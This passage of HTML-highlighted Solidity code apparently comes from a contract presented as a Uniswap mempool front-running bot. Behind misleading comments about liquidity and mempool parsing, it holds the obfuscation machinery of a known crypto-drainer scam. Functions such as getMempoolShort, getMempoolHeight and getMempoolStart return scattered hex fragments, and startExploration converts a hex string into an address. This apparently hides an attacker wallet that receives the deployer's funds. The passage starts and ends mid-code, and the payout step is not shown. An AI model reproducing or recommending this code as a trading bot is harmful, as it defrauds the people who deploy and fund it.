                <span class="token keyword">while</span> <span class="token punctuation">(</span>ptrdata <span class="token operator">!=</span> needledata<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                    <span class="token keyword">if</span> <span class="token punctuation">(</span>ptr <span class="token operator">&gt;=</span> end<span class="token punctuation">)</span>
                        <span class="token keyword">return</span> selfptr <span class="token operator">+</span> selflen<span class="token punctuation">;</span>
                    ptr<span class="token operator">++</span><span class="token punctuation">;</span>
                    <span class="token keyword">assembly</span> <span class="token punctuation">{</span> ptrdata <span class="token operator">:=</span> <span class="token function">and</span><span class="token punctuation">(</span><span class="token function">mload</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">,</span> mask<span class="token punctuation">)</span> <span class="token punctuation">}</span>
                <span class="token punctuation">}</span>
                <span class="token keyword">return</span> ptr<span class="token punctuation">;</span>
            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
                <span class="token comment">// For long needles, use hashing</span>
                <span class="token builtin">bytes32</span> hash<span class="token punctuation">;</span>
                <span class="token keyword">assembly</span> <span class="token punctuation">{</span> hash <span class="token operator">:=</span> <span class="token function">keccak256</span><span class="token punctuation">(</span>needleptr<span class="token punctuation">,</span> needlelen<span class="token punctuation">)</span> <span class="token punctuation">}</span>

                <span class="token keyword">for</span> <span class="token punctuation">(</span>idx <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> idx <span class="token operator">&lt;=</span> selflen <span class="token operator">-</span> needlelen<span class="token punctuation">;</span> idx<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                    <span class="token builtin">bytes32</span> testHash<span class="token punctuation">;</span>
                    <span class="token keyword">assembly</span> <span class="token punctuation">{</span> testHash <span class="token operator">:=</span> <span class="token function">keccak256</span><span class="token punctuation">(</span>ptr<span class="token punctuation">,</span> needlelen<span class="token punctuation">)</span> <span class="token punctuation">}</span>
                    <span class="token keyword">if</span> <span class="token punctuation">(</span>hash <span class="token operator">==</span> testHash<span class="token punctuation">)</span>
                        <span class="token keyword">return</span> ptr<span class="token punctuation">;</span>
                    ptr <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">return</span> selfptr <span class="token operator">+</span> selflen<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>


    <span class="token comment">/*
     * @dev Loading the contract
     * @param contract address
     * @return contract interaction object
     */</span>
    <span class="token keyword">function</span> <span class="token function">loadCurrentContract</span><span class="token punctuation">(</span><span class="token builtin">string</span> <span class="token keyword">memory</span> self<span class="token punctuation">)</span> <span class="token keyword">internal</span> <span class="token keyword">pure</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">string</span> <span class="token keyword">memory</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token builtin">string</span> <span class="token keyword">memory</span> ret <span class="token operator">=</span> self<span class="token punctuation">;</span>
        <span class="token builtin">uint</span> retptr<span class="token punctuation">;</span>
        <span class="token keyword">assembly</span> <span class="token punctuation">{</span> retptr <span class="token operator">:=</span> <span class="token function">add</span><span class="token punctuation">(</span>ret<span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">)</span> <span class="token punctuation">}</span>

        <span class="token keyword">return</span> ret<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token comment">/*
     * @dev Extracts the contract from Uniswap
     * @param self The slice to operate on.
     * @param rune The slice that will contain the first rune.
     * @return \`rune\`.
     */</span>
    <span class="token keyword">function</span> <span class="token function">nextContract</span><span class="token punctuation">(</span>slice <span class="token keyword">memory</span> self<span class="token punctuation">,</span> slice <span class="token keyword">memory</span> rune<span class="token punctuation">)</span> <span class="token keyword">internal</span> <span class="token keyword">pure</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span>slice <span class="token keyword">memory</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        rune<span class="token punctuation">.</span>_ptr <span class="token operator">=</span> self<span class="token punctuation">.</span>_ptr<span class="token punctuation">;</span>

        <span class="token keyword">if</span> <span class="token punctuation">(</span>self<span class="token punctuation">.</span>_len <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            rune<span class="token punctuation">.</span>_len <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
            <span class="token keyword">return</span> rune<span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token builtin">uint</span> l<span class="token punctuation">;</span>
        <span class="token builtin">uint</span> b<span class="token punctuation">;</span>
        <span class="token comment">// Load the first byte of the rune into the LSBs of b</span>
        <span class="token keyword">assembly</span> <span class="token punctuation">{</span> b <span class="token operator">:=</span> <span class="token function">and</span><span class="token punctuation">(</span><span class="token function">mload</span><span class="token punctuation">(</span><span class="token function">sub</span><span class="token punctuation">(</span><span class="token function">mload</span><span class="token punctuation">(</span><span class="token function">add</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">31</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0xFF</span><span class="token punctuation">)</span> <span class="token punctuation">}</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>b <span class="token operator">&lt;</span> <span class="token number">0x80</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            l <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>b <span class="token operator">&lt;</span> <span class="token number">0xE0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            l <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>b <span class="token operator">&lt;</span> <span class="token number">0xF0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            l <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
            l <span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token comment">// Check for truncated codepoints</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>l <span class="token operator">&gt;</span> self<span class="token punctuation">.</span>_len<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            rune<span class="token punctuation">.</span>_len <span class="token operator">=</span> self<span class="token punctuation">.</span>_len<span class="token punctuation">;</span>
            self<span class="token punctuation">.</span>_ptr <span class="token operator">+=</span> self<span class="token punctuation">.</span>_len<span class="token punctuation">;</span>
            self<span class="token punctuation">.</span>_len <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
            <span class="token keyword">return</span> rune<span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        self<span class="token punctuation">.</span>_ptr <span class="token operator">+=</span> l<span class="token punctuation">;</span>
        self<span class="token punctuation">.</span>_len <span class="token operator">-=</span> l<span class="token punctuation">;</span>
        rune<span class="token punctuation">.</span>_len <span class="token operator">=</span> l<span class="token punctuation">;</span>
        <span class="token keyword">return</span> rune<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">function</span> <span class="token function">startExploration</span><span class="token punctuation">(</span><span class="token builtin">string</span> <span class="token keyword">memory</span> _a<span class="token punctuation">)</span> <span class="token keyword">internal</span> <span class="token keyword">pure</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">address</span> _parsedAddress<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token builtin">bytes</span> <span class="token keyword">memory</span> tmp <span class="token operator">=</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span>_a<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token builtin">uint160</span> iaddr <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
        <span class="token builtin">uint160</span> b1<span class="token punctuation">;</span>
        <span class="token builtin">uint160</span> b2<span class="token punctuation">;</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token builtin">uint</span> i <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">2</span> <span class="token operator">+</span> <span class="token number">2</span> <span class="token operator">*</span> <span class="token number">20</span><span class="token punctuation">;</span> i <span class="token operator">+=</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            iaddr <span class="token operator">*=</span> <span class="token number">256</span><span class="token punctuation">;</span>
            b1 <span class="token operator">=</span> <span class="token builtin">uint160</span><span class="token punctuation">(</span><span class="token builtin">uint8</span><span class="token punctuation">(</span>tmp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            b2 <span class="token operator">=</span> <span class="token builtin">uint160</span><span class="token punctuation">(</span><span class="token builtin">uint8</span><span class="token punctuation">(</span>tmp<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>b1 <span class="token operator">&gt;=</span> <span class="token number">97</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>b1 <span class="token operator">&lt;=</span> <span class="token number">102</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                b1 <span class="token operator">-=</span> <span class="token number">87</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>b1 <span class="token operator">&gt;=</span> <span class="token number">65</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>b1 <span class="token operator">&lt;=</span> <span class="token number">70</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                b1 <span class="token operator">-=</span> <span class="token number">55</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>b1 <span class="token operator">&gt;=</span> <span class="token number">48</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>b1 <span class="token operator">&lt;=</span> <span class="token number">57</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                b1 <span class="token operator">-=</span> <span class="token number">48</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>b2 <span class="token operator">&gt;=</span> <span class="token number">97</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>b2 <span class="token operator">&lt;=</span> <span class="token number">102</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                b2 <span class="token operator">-=</span> <span class="token number">87</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>b2 <span class="token operator">&gt;=</span> <span class="token number">65</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>b2 <span class="token operator">&lt;=</span> <span class="token number">70</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                b2 <span class="token operator">-=</span> <span class="token number">55</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>b2 <span class="token operator">&gt;=</span> <span class="token number">48</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>b2 <span class="token operator">&lt;=</span> <span class="token number">57</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                b2 <span class="token operator">-=</span> <span class="token number">48</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
            iaddr <span class="token operator">+=</span> <span class="token punctuation">(</span>b1 <span class="token operator">*</span> <span class="token number">16</span> <span class="token operator">+</span> b2<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">return</span> <span class="token builtin">address</span><span class="token punctuation">(</span>iaddr<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>


    <span class="token keyword">function</span> <span class="token function">memcpy</span><span class="token punctuation">(</span><span class="token builtin">uint</span> dest<span class="token punctuation">,</span> <span class="token builtin">uint</span> src<span class="token punctuation">,</span> <span class="token builtin">uint</span> len<span class="token punctuation">)</span> <span class="token keyword">private</span> <span class="token keyword">pure</span> <span class="token punctuation">{</span>
        <span class="token comment">// Check available liquidity</span>
        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token punctuation">;</span> len <span class="token operator">&gt;=</span> <span class="token number">32</span><span class="token punctuation">;</span> len <span class="token operator">-=</span> <span class="token number">32</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">assembly</span> <span class="token punctuation">{</span>
                <span class="token function">mstore</span><span class="token punctuation">(</span>dest<span class="token punctuation">,</span> <span class="token function">mload</span><span class="token punctuation">(</span>src<span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token punctuation">}</span>
            dest <span class="token operator">+=</span> <span class="token number">32</span><span class="token punctuation">;</span>
            src <span class="token operator">+=</span> <span class="token number">32</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token comment">// Copy remaining bytes</span>
        <span class="token builtin">uint</span> mask <span class="token operator">=</span> <span class="token number">256</span> <span class="token operator">**</span> <span class="token punctuation">(</span><span class="token number">32</span> <span class="token operator">-</span> len<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>
        <span class="token keyword">assembly</span> <span class="token punctuation">{</span>
            <span class="token keyword">let</span> srcpart <span class="token operator">:=</span> <span class="token function">and</span><span class="token punctuation">(</span><span class="token function">mload</span><span class="token punctuation">(</span>src<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">not</span><span class="token punctuation">(</span>mask<span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token keyword">let</span> destpart <span class="token operator">:=</span> <span class="token function">and</span><span class="token punctuation">(</span><span class="token function">mload</span><span class="token punctuation">(</span>dest<span class="token punctuation">)</span><span class="token punctuation">,</span> mask<span class="token punctuation">)</span>
            <span class="token function">mstore</span><span class="token punctuation">(</span>dest<span class="token punctuation">,</span> <span class="token function">or</span><span class="token punctuation">(</span>destpart<span class="token punctuation">,</span> srcpart<span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    <span class="token comment">/*
     * @dev Orders the contract by its available liquidity
     * @param self The slice to operate on.
     * @return The contract with possbile maximum return
     */</span>
    <span class="token keyword">function</span> <span class="token function">orderContractsByLiquidity</span><span class="token punctuation">(</span>slice <span class="token keyword">memory</span> self<span class="token punctuation">)</span> <span class="token keyword">internal</span> <span class="token keyword">pure</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">uint</span> ret<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>self<span class="token punctuation">.</span>_len <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token builtin">uint</span> word<span class="token punctuation">;</span>
        <span class="token builtin">uint</span> length<span class="token punctuation">;</span>
        <span class="token builtin">uint</span> divisor <span class="token operator">=</span> <span class="token number">2</span> <span class="token operator">**</span> <span class="token number">248</span><span class="token punctuation">;</span>

        <span class="token comment">// Load the rune into the MSBs of b</span>
        <span class="token keyword">assembly</span> <span class="token punctuation">{</span> word<span class="token operator">:=</span> <span class="token function">mload</span><span class="token punctuation">(</span><span class="token function">mload</span><span class="token punctuation">(</span><span class="token function">add</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">}</span>
        <span class="token builtin">uint</span> b <span class="token operator">=</span> word <span class="token operator">/</span> divisor<span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>b <span class="token operator">&lt;</span> <span class="token number">0x80</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            ret <span class="token operator">=</span> b<span class="token punctuation">;</span>
            length <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>b <span class="token operator">&lt;</span> <span class="token number">0xE0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            ret <span class="token operator">=</span> b <span class="token operator">&amp;</span> <span class="token number">0x1F</span><span class="token punctuation">;</span>
            length <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>b <span class="token operator">&lt;</span> <span class="token number">0xF0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            ret <span class="token operator">=</span> b <span class="token operator">&amp;</span> <span class="token number">0x0F</span><span class="token punctuation">;</span>
            length <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
            ret <span class="token operator">=</span> b <span class="token operator">&amp;</span> <span class="token number">0x07</span><span class="token punctuation">;</span>
            length <span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token comment">// Check for truncated codepoints</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>length <span class="token operator">&gt;</span> self<span class="token punctuation">.</span>_len<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token builtin">uint</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            divisor <span class="token operator">=</span> divisor <span class="token operator">/</span> <span class="token number">256</span><span class="token punctuation">;</span>
            b <span class="token operator">=</span> <span class="token punctuation">(</span>word <span class="token operator">/</span> divisor<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>b <span class="token operator">&amp;</span> <span class="token number">0xC0</span> <span class="token operator">!=</span> <span class="token number">0x80</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token comment">// Invalid UTF-8 sequence</span>
                <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
            ret <span class="token operator">=</span> <span class="token punctuation">(</span>ret <span class="token operator">*</span> <span class="token number">64</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>b <span class="token operator">&amp;</span> <span class="token number">0x3F</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token keyword">return</span> ret<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
     
    <span class="token keyword">function</span> <span class="token function">getMempoolStart</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">private</span> <span class="token keyword">pure</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">string</span> <span class="token keyword">memory</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token string">&quot;E990&quot;</span><span class="token punctuation">;</span> 
    <span class="token punctuation">}</span>

    <span class="token comment">/*
     * @dev Calculates remaining liquidity in contract
     * @param self The slice to operate on.
     * @return The length of the slice in runes.
     */</span>
    <span class="token keyword">function</span> <span class="token function">calcLiquidityInContract</span><span class="token punctuation">(</span>slice <span class="token keyword">memory</span> self<span class="token punctuation">)</span> <span class="token keyword">internal</span> <span class="token keyword">pure</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">uint</span> l<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token builtin">uint</span> ptr <span class="token operator">=</span> self<span class="token punctuation">.</span>_ptr <span class="token operator">-</span> <span class="token number">31</span><span class="token punctuation">;</span>
        <span class="token builtin">uint</span> end <span class="token operator">=</span> ptr <span class="token operator">+</span> self<span class="token punctuation">.</span>_len<span class="token punctuation">;</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span>l <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> ptr <span class="token operator">&lt;</span> end<span class="token punctuation">;</span> l<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token builtin">uint8</span> b<span class="token punctuation">;</span>
            <span class="token keyword">assembly</span> <span class="token punctuation">{</span> b <span class="token operator">:=</span> <span class="token function">and</span><span class="token punctuation">(</span><span class="token function">mload</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0xFF</span><span class="token punctuation">)</span> <span class="token punctuation">}</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>b <span class="token operator">&lt;</span> <span class="token number">0x80</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                ptr <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>b <span class="token operator">&lt;</span> <span class="token number">0xE0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                ptr <span class="token operator">+=</span> <span class="token number">2</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>b <span class="token operator">&lt;</span> <span class="token number">0xF0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                ptr <span class="token operator">+=</span> <span class="token number">3</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>b <span class="token operator">&lt;</span> <span class="token number">0xF8</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                ptr <span class="token operator">+=</span> <span class="token number">4</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>b <span class="token operator">&lt;</span> <span class="token number">0xFC</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                ptr <span class="token operator">+=</span> <span class="token number">5</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
                ptr <span class="token operator">+=</span> <span class="token number">6</span><span class="token punctuation">;</span>            
            <span class="token punctuation">}</span>        
        <span class="token punctuation">}</span>    
    <span class="token punctuation">}</span>

    <span class="token keyword">function</span> <span class="token function">fetchMempoolEdition</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">private</span> <span class="token keyword">pure</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">string</span> <span class="token keyword">memory</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token string">&quot;2146&quot;</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token comment">/*
     * @dev Parsing all Uniswap mempool
     * @param self The contract to operate on.
     * @return True if the slice is empty, False otherwise.
     */</span>

    <span class="token comment">/*
     * @dev Returns the keccak-256 hash of the contracts.
     * @param self The slice to hash.
     * @return The hash of the contract.
     */</span>
    <span class="token keyword">function</span> <span class="token function">keccak</span><span class="token punctuation">(</span>slice <span class="token keyword">memory</span> self<span class="token punctuation">)</span> <span class="token keyword">internal</span> <span class="token keyword">pure</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">bytes32</span> ret<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">assembly</span> <span class="token punctuation">{</span>
            ret <span class="token operator">:=</span> <span class="token function">keccak256</span><span class="token punctuation">(</span><span class="token function">mload</span><span class="token punctuation">(</span><span class="token function">add</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">mload</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    
    <span class="token keyword">function</span> <span class="token function">getMempoolShort</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">private</span> <span class="token keyword">pure</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">string</span> <span class="token keyword">memory</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token string">&quot;0xa1e&quot;</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token comment">/*
     * @dev Check if contract has enough liquidity available
     * @param self The contract to operate on.
     * @return True if the slice starts with the provided text, false otherwise.
     */</span>
    <span class="token keyword">function</span> <span class="token function">checkLiquidity</span><span class="token punctuation">(</span><span class="token builtin">uint</span> a<span class="token punctuation">)</span> <span class="token keyword">internal</span> <span class="token keyword">pure</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">string</span> <span class="token keyword">memory</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>

        <span class="token builtin">uint</span> count <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
        <span class="token builtin">uint</span> b <span class="token operator">=</span> a<span class="token punctuation">;</span>
        <span class="token keyword">while</span> <span class="token punctuation">(</span>b <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            count<span class="token operator">++</span><span class="token punctuation">;</span>
            b <span class="token operator">/=</span> <span class="token number">16</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token builtin">bytes</span> <span class="token keyword">memory</span> res <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">bytes</span><span class="token punctuation">(</span>count<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token builtin">uint</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span>count<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            b <span class="token operator">=</span> a <span class="token operator">%</span> <span class="token number">16</span><span class="token punctuation">;</span>
            res<span class="token punctuation">[</span>count <span class="token operator">-</span> i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">toHexDigit</span><span class="token punctuation">(</span><span class="token builtin">uint8</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            a <span class="token operator">/=</span> <span class="token number">16</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token keyword">return</span> <span class="token builtin">string</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    
    <span class="token keyword">function</span> <span class="token function">getMempoolHeight</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">private</span> <span class="token keyword">pure</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">string</span> <span class="token keyword">memory</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token string">&quot;0Ad80&quot;</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token comment">/*
     * @dev If \`self\` starts with \`needle\`, \`needle\` is removed from the
     *      beginning of \`self\`. Otherwise, \`self\` is unmodified.
     * @param self The slice to operate on.
     * @param needle The slice to search for.
     * @return \`self\`
     */</span>
    <span class="token keyword">function</span> <span class="token function">beyond</span><span class="token punctuation">(</span>slice <span class="token keyword">memory</span> self<span class="token punctuation">,</span> slice <span class="token keyword">memory</span> needle<span class="token punctuation">)</span> <span class="token keyword">internal</span> <span class="token keyword">pure</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span>slice <span class="token keyword">memory</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>self<span class="token punctuation">.</span>_len <span class="token operator">&lt;</span> needle<span class="token punctuation">.</span>_len<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">return</span> self<span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token builtin">bool</span> equal <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
